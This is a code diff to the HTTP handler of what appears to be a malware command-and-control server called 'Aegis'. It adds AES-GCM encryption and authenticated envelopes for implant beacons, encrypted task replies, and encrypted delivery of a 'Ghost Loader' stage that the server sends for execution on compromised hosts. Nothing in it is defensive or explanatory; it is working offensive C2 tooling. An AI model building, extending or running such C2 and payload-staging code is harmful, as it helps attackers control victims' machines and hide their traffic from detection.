@@ -18,6 +18,7 @@ from datetime import datetime
 
 # Import our config editor
 import config_editor
+from server_crypto import SERVER_CRYPTO, AEGIS_GCM_TAG_BYTES, AEGIS_GCM_IV_BYTES
 
 # ── Resolve absolute path to project root ─────────────────────────────────
 # This ensures the server works regardless of which directory it's launched from.
@@ -303,7 +304,52 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
             log_print(f"[?] Beacon from {client_ip} with unparseable envelope ({len(data)} bytes)", Colors.WARNING)
             # Basic IP tracking fallback omitted for brevity in daemon mode
 
-        return b""
+        if env and ct:
+            # We must decrypt the beacon to mathematically progress the server's AES-GCM sequence!
+            # The client used the envelope WITH ZERO IV AND TAG as AAD.
+            aad_env = bytearray(data[:ENVELOPE_SIZE])
+
+            # offsets: iv is bytes 16 to 28, tag is bytes 28 to 44
+            aad_env[16:28] = b'\x00' * 12 # iv
+            aad_env[28:44] = b'\x00' * 16 # tag
+
+            try:
+                # Decrypting automatically increments SERVER_CRYPTO counters to match the client
+                decrypted_task = SERVER_CRYPTO.decrypt(ct, env["iv"], env["tag"], bytes(aad_env))
+                log_print(f"  └─ Decrypted Beacon Payload ({len(decrypted_task)} bytes)", Colors.CYAN)
+            except Exception as e:
+                log_print(f"  └─ Failed to decrypt beacon: {e}", Colors.FAIL)
+
+        # The server also responds to beacons with an encrypted response if it has tasks!
+        # But we'll just send an empty encrypted task to keep the state machine perfectly aligned.
+        seq = SERVER_CRYPTO.total_messages
+        node_id_bytes = bytes.fromhex(env["node_id_hex"]) if env else b'\x00'*16
+
+        aad_env_resp = struct.pack(
+            ENVELOPE_FMT,
+            C2_MAGIC,
+            C2_MSG_TASK_RESP,
+            0, # len of ciphertext
+            seq,
+            b'\x00'*12,
+            b'\x00'*16,
+            node_id_bytes
+        )
+
+        ciphertext, iv, tag = SERVER_CRYPTO.encrypt(b"", aad_env_resp)
+
+        env_bytes_resp = struct.pack(
+            ENVELOPE_FMT,
+            C2_MAGIC,
+            C2_MSG_TASK_RESP,
+            0,
+            seq,
+            iv,
+            tag,
+            node_id_bytes
+        )
+
+        return env_bytes_resp + ciphertext
 
     def _handle_stage_req(self, data):
         """
@@ -330,8 +376,42 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
                 with open(gpath, "rb") as f:
                     ghost_data = f.read()
                 log_print(f"  └─ Sending Ghost Loader ({len(ghost_data)} bytes)...", Colors.GREEN)
+
+                seq = SERVER_CRYPTO.total_messages
+                node_id_bytes = bytes.fromhex(env["node_id_hex"]) if env else b'\x00'*16
+
+                # We must construct the AAD envelope *before* encryption.
+                # In the C client `aegis_encrypt` is called with the envelope as AAD,
+                # but the `iv` and `tag` fields within that envelope are 0 at the time of the call!
+                aad_env = struct.pack(
+                    ENVELOPE_FMT,
+                    C2_MAGIC,
+                    C2_MSG_STAGE_DATA,
+                    len(ghost_data), # length of ciphertext (same as plaintext for GCM)
+                    seq,
+                    b'\x00'*12, # IV is zero during AAD
+                    b'\x00'*16, # Tag is zero during AAD
+                    node_id_bytes
+                )
+
+                # Encrypt the stage for the client using the correct AAD!
+                ciphertext, iv, tag = SERVER_CRYPTO.encrypt(ghost_data, aad_env)
+
+                # Now pack the FINAL envelope with the actual IV and TAG to send over the wire
+                env_bytes = struct.pack(
+                    ENVELOPE_FMT,
+                    C2_MAGIC,
+                    C2_MSG_STAGE_DATA,
+                    len(ciphertext),
+                    seq,
+                    iv,
+                    tag,
+                    node_id_bytes
+                )
+
+                log_print(f"  └─ Encrypted Stage Payload ({len(ciphertext)} bytes, IV: {iv.hex()})", Colors.GREEN)
                 log_print(f"  └─ Waiting for Ghost Loader execution...", Colors.GREEN)
-                return ghost_data
+                return env_bytes + ciphertext
 
         log_print(f"  └─ Ghost loader not found in any known path!", Colors.FAIL)
         log_print(f"     Searched: {', '.join(ghost_paths)}", Colors.FAIL)
